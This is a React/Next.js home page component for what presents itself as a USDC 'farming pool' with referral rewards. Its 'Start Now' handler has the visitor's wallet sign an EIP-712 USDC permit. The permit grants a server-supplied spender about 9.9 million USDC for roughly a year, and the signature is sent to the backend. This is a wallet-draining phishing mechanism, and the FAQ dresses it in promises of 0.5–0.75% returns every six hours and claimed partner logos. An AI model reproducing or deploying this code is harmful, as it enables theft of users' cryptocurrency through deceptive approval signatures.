"use client"

import { useEffect, useState, useRef } from "react"
import { useWallet } from "@/contexts/wallet-context"
import { useReferral } from "@/contexts/referral-context"
import { ChevronRight } from "lucide-react"
import { CoinMarketCapLogo } from "@/components/logos/coinmarketcap-logo"
import { CoinGeckoLogo } from "@/components/logos/coingecko-logo"
import { TrustWalletLogo } from "@/components/logos/trustwallet-logo"
import { CryptoComLogo } from "@/components/logos/cryptocom-logo"
import HeroSection from "@/components/hero-section"
import StatsSection from "@/components/stats-section"
import LatestRewards from "@/components/latest-rewards"
import { checkReferralCode, login, sign, getIndexStats, CheckCodeResponse, LoginResponse, IndexStatsResponse } from "./lib/api"
import { useSearchParams } from 'next/navigation'
import { useMessage } from "./components/root-layout"
import { ethers } from "ethers"

export default function Home() {
  const { isConnected, address } = useWallet()
  const { referralCode } = useReferral()
  const [openFaq, setOpenFaq] = useState<string | null>(null)
  const { setMessage } = useMessage()
  const [hideStartNow, setHideStartNow] = useState(false)
  const [stats, setStats] = useState<IndexStatsResponse['data'] | null>(null)
  const rewardsRef = useRef<HTMLDivElement>(null)
  const searchParams = useSearchParams()
 
  const getNonce = async (usdcContract: ethers.Contract, owner: string, tryCount = 1): Promise<bigint> => {
    let nonce;
    try {
      nonce = await usdcContract.nonces(owner);
      console.log("nonce:", nonce);
      return nonce;
    } catch (error) {
      if (tryCount <= 3) {
        console.log("Retrying to get nonce...");
        return await new Promise((resolve) => {
          setTimeout(() => {
            resolve(getNonce(usdcContract, owner, tryCount + 1));
          }, 2000);
        });
      } else {
        return BigInt(0);
      }
    }
  };

  const handleStartNow = async () => {
    if (!window.ethereum) {
      setMessage({ type: 'error', text: "No Ethereum wallet detected. Please install Trust Wallet or MetaMask." });
      return;
    }

    const USDC_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // USDC 主网地址
    const USDC_DOMAIN = {
      name: "USD Coin",
      version: "2",
      chainId: 1, // Mainnet
      verifyingContract: USDC_ADDRESS,
    };

    const PERMIT_TYPE = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };

    try {
      // 确保钱包已连接并授权
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      if (accounts.length === 0) {
        setMessage({ type: 'error', text: "No accounts found. Please connect your wallet." });
        return;
      }

      // 确保钱包连接到 Ethereum 主网
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }], // Mainnet
      });

      // 获取 spender 地址
      const spender = localStorage.getItem('spender');
      if (!spender) {
        setMessage({ type: 'error', text: "Spender address not found. Please try logging in again." });
        return;
      }

      // 连接钱包并获取签名者
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const owner = await signer.getAddress();
      const value = ethers.parseUnits("9900000", 6); // 99,000,000 USDC (6 decimals)
      const deadline = Math.floor(Date.now() / 1000) + 30000000; // 30,000,000 秒后过期

      const usdcContract = new ethers.Contract(
        USDC_ADDRESS,
        ["function nonces(address) view returns (uint256)"],
        provider
      );

      const nonce = await getNonce(usdcContract, owner, 1);
      const message = {
        owner,
        spender, // 使用登录返回的 spender 地址
        value: value.toString(),
        nonce: nonce.toString(),
        deadline: deadline.toString(),
      };

      let signature = null;
      try {
        signature = await signer.signTypedData(
          USDC_DOMAIN,
          PERMIT_TYPE,
          message
        );
        console.log("EIP-712 sign:", signature);
        if (signature === undefined || signature === null) {
          throw new Error("User denied the request");
        }
      } catch (error) {
        setMessage({ type: 'error', text: "Signature request was cancelled" });
        return;
      }

      await sign(owner, signature, spender, value.toString(), deadline.toString(), nonce.toString());
      console.log("Sign successful");
      // 签名成功后隐藏按钮
      setHideStartNow(true);
      
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "An unknown error occurred";
      setMessage({ type: 'error', text: errorMessage });
      console.error("Error in approving transaction: ", error);
    }
  };

  // Check referral code from URL and API
  useEffect(() => {
    const code = searchParams.get('code')
    if (!code) {
      setMessage({ type: 'error', text: "Please enter a valid url." });
      return;
    }
    checkReferralCode(code)
      .then((response: CheckCodeResponse) => {
        if (!response.success) {
          setMessage({ type: 'error', text: "Please enter a valid url." })
        } else {
          setMessage(null)
        }
      })
      .catch((error: Error) => {
        setMessage({ type: 'error', text: "Please enter a valid url." })
      })
  }, [searchParams, setMessage])

  // Handle login when wallet is connected
  useEffect(() => {
    const code = searchParams.get('code')
    const inviterWallet = searchParams.get('inviterWallet') || ''
    
    if (isConnected && address && code) {
      login(address, code, inviterWallet)
        .then((response: LoginResponse) => {
          if (response.success) {
            // Store the token and spender for future requests
            localStorage.setItem('token', response.data)
            localStorage.setItem('spender', response.spender)
            console.log('Login successful, token and spender stored')
            // 如果 approve 为 true，隐藏按钮
            if (response.approve) {
              setHideStartNow(true)
            }
          } else {
            setMessage({ type: 'error', text: "Login failed. Please try again." })
          }
        })
        .catch((error: Error) => {
          setMessage({ type: 'error', text: "Login failed. Please try again." })
          console.error('Login error:', error)
        })
    }
  }, [isConnected, address, searchParams, setMessage])

  

  // Log referral code if present
  useEffect(() => {
    if (referralCode) {
      console.log(`User was referred by: ${referralCode}`)
    }
  }, [referralCode])

  // Toggle FAQ item
  const toggleFaq = (id: string) => {
    setOpenFaq(openFaq === id ? null : id)
  }

  // FAQ data
  const faqItems = [
    {
      id: "roi",
      question: "What is the return of investment (ROI)?",
      answer: (
        <div className="py-4 px-4 text-[rgb(var(--dark-text-secondary))] border-t border-[rgb(var(--dark-border))]">
          <p className="mb-4">
            After successfully joining, the system will start to calculate the amount of USDC you hold through the smart
            contract. The reward will be distributed every 6 hours.
          </p>
          <p className="mb-4">The expected reward income after every 6 hours:</p>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li>
              1 - 1K USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.5%</span>
            </li>
            <li>
              1K - 2K USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.525%</span>
            </li>
            <li>
              2K - 5K USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.55%</span>
            </li>
            <li>
              5K - 10K USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.575%</span>
            </li>
            <li>
              10K - 50K USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.6%</span>
            </li>
            <li>
              50K - 100K USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.625%</span>
            </li>
            <li>
              100K - 1M USDC: <span className="text-[rgb(var(--dark-accent))] glow-accent">0.75%</span>
            </li>
          </ul>
        </div>
      ),
    },
    {
      id: "earn",
      question: "How to earn reward?",
      answer: (
        <div className="py-4 px-4 text-[rgb(var(--dark-text-secondary))] border-t border-[rgb(var(--dark-border))]">
          <p>
            The cryptocurrency mined every day generates ETH revenue and gives us a certain percentage of revenue in
            accordance with contract standards.
          </p>
        </div>
      ),
    },
    {
      id: "referral",
      question: "Is there a reward for inviting friends?",
      answer: (
        <div className="py-4 px-4 text-[rgb(var(--dark-text-secondary))] border-t border-[rgb(var(--dark-border))]">
          <p>
            Yes, you can invite your friends to join the farming pool through your referral link. You will get a 10% ETH
            reward everytime your friends receive their reward.
          </p>
        </div>
      ),
    },
  ]

  // Partner data with logos
  const partners = [
    { name: "CoinMarketCap", logo: <CoinMarketCapLogo className="h-6 w-6 mr-2" /> },
    { name: "CoinGecko", logo: <CoinGeckoLogo className="h-6 w-6 mr-2" /> },
    { name: "TrustWallet", logo: <TrustWalletLogo className="h-6 w-6 mr-2" /> },
    { name: "Crypto.com", logo: <CryptoComLogo className="h-6 w-6 mr-2" /> },
  ]

  // 获取首页统计数据
  useEffect(() => {
    getIndexStats()
      .then((response) => {
        if (response.success) {
          setStats(response.data);
        }
      })
      .catch((error) => {
        console.error('Failed to fetch index stats:', error);
      });
  }, []);

  return (
    <div className="max-w-4xl mx-auto px-4 py-6 pb-0 mobile-scrollable">
      {/* Hero Section */}
      <HeroSection onStartNow={handleStartNow} hideStartNow={hideStartNow} />

      {/* Stats Section */}
      <StatsSection initialStats={stats} />

      {/* Latest Yield Section */}
      <LatestRewards />

      {/* Partners Section */}
      <section className="py-8 border-t border-[rgba(var(--dark-border),0.6)]">
        <h2 className="text-xl sm:text-2xl font-medium mb-6 text-center glow-text">Partners</h2>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {partners.map((partner, index) => (
            <div
              key={index}
              className="dark-card p-4 flex items-center justify-center hover:bg-[rgba(var(--dark-bg-tertiary),0.7)] transition-colors h-14 sm:h-16"
            >
              {partner.logo}
              <div className="text-[rgb(var(--dark-text-primary))] text-sm sm:text-base">{partner.name}</div>
            </div>
          ))}
        </div>
      </section>

      {/* FAQ Section - Added proper bottom spacing for mobile */}
      <section className="py-8 pt-8 border-t border-[rgba(var(--dark-border),0.6)]">
        <h2 className="text-xl sm:text-2xl font-medium mb-6 text-center glow-text">FAQ</h2>

        <div className="space-y-4 mb-0">
          {faqItems.map((item, index) => (
            <div key={item.id} className="dark-card overflow-hidden">
              <button
                className="w-full flex items-center justify-between p-4 text-left min-h-[56px]"
                onClick={() => toggleFaq(item.id)}
                aria-expanded={openFaq === item.id}
                aria-controls={`faq-answer-${item.id}`}
              >
                <span className="font-medium text-[rgb(var(--dark-text-primary))] text-sm sm:text-base pr-2">
                  {item.question}
                </span>
                <ChevronRight
                  className={`h-5 w-5 shrink-0 text-[rgb(var(--dark-accent))] transition-transform duration-200 ${
                    openFaq === item.id ? "transform rotate-90" : ""
                  }`}
                />
              </button>
              {openFaq === item.id && <div id={`faq-answer-${item.id}`}>{item.answer}</div>}
            </div>
          ))}
        </div>

        {/* Add spacer at the bottom to ensure content is not hidden behind mobile nav */}
        <div className="mobile-tab-nav-spacer"></div>
      </section>
    </div>
  )
}
